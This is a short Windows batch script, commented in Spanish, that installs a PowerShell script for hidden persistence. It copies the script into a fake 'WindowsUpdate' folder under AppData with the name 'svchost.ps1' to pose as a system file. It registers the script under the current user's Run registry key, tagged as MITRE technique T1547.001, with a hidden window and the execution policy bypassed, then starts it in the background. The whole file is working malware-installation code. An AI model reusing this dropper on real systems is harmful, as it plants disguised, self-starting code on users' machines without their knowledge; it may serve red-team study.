@echo off
:: 1. Crear carpeta de mimetización
mkdir "C:\Users\%USERNAME%\AppData\Roaming\WindowsUpdate"

:: 2. Copiar el script de powershell (Mimetización)
copy "win_service.ps1" "C:\Users\%USERNAME%\AppData\Roaming\WindowsUpdate\svchost.ps1"

:: 3. PERSISTENCIA: Añadir a la clave de registro Run (Técnica T1547.001)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\%USERNAME%\AppData\Roaming\WindowsUpdate\svchost.ps1" /f

:: 4. Ejecutarlo por primera vez en segundo plano
start /b powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\%USERNAME%\AppData\Roaming\WindowsUpdate\svchost.ps1